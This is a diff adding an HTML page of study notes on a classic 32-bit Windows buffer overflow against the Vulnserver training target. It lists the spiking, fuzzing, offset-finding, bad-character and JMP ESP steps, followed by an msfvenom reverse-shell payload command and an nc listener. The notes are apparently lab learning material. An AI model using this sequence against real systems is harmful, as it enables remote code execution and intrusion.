@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Buffer overflows</title>
+</head><body>Classic example: Vulnserver (32-bit Windows buffer overflow)<br/>
+https://tcm-sec.com/2019/05/25/buffer-overflows-made-easy/<br/>
+Memory (top to bottom): Kernel -&gt; Stack -&gt; Heap -&gt; Data -&gt; Text<br/>
+Stack anatomy (top to bottom): ESP -&gt; Buffer -&gt; EBP -&gt; EIP<br/>
+General methodology:<ul><li style="list-style-type: none">1. Spiking:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">generic_send_tcp 192.168.254.29 9999 stats.spk 0 0</li>
+<li style="list-style-type: none">generic_send_tcp 192.168.254.29 9999 trun.spk 0 0</li>
+</ul>
+</li>
+<li style="list-style-type: none">2. Fuzzing:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">./1.py</li>
+</ul>
+</li>
+<li style="list-style-type: none">3. Finding the offset:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000</li>
+<li style="list-style-type: none">./2.py</li>
+<li style="list-style-type: none">EIP 386F4337</li>
+<li style="list-style-type: none">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337</li>
+</ul>
+</li>
+<li style="list-style-type: none">4. Overwriting the EIP:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">./3.py</li>
+</ul>
+</li>
+<li style="list-style-type: none">5. Finding bad characters:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">./4.py</li>
+</ul>
+</li>
+<li style="list-style-type: none">6. Finding the right module:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">https://github.com/corelan/mona/blob/master/mona.py</li>
+<li style="list-style-type: none">Copy mona.py to C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</li>
+<li style="list-style-type: none">Execute the command "!mona modules" in Immunity Debugger</li>
+<li style="list-style-type: none">Find the op code equivalent of a JMP</li>
+<li style="list-style-type: none">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</li>
+<li style="list-style-type: none">nasm &gt; JMP ESP</li>
+<li style="list-style-type: none">Execute in Immunity: "!mona find -s "\xff\xe4" -m essfunc.dll"</li>
+<li style="list-style-type: none">Note down 0x625011af</li>
+<li style="list-style-type: none">Set breakpoint in Immunity at 625011af</li>
+<li style="list-style-type: none">./5.py</li>
+</ul>
+</li>
+<li style="list-style-type: none">7. Generating shellcode and gaining root:</li>
+<li style="list-style-type: none"><ul><li style="list-style-type: none">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.254.28 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"</li>
+<li style="list-style-type: none">nc -nvlp 4444</li>
+<li style="list-style-type: none">./6.py</li>
+<li style="list-style-type: none">BINGO!</li>
+</ul>
+</li>
+</ul>
+</body></html>
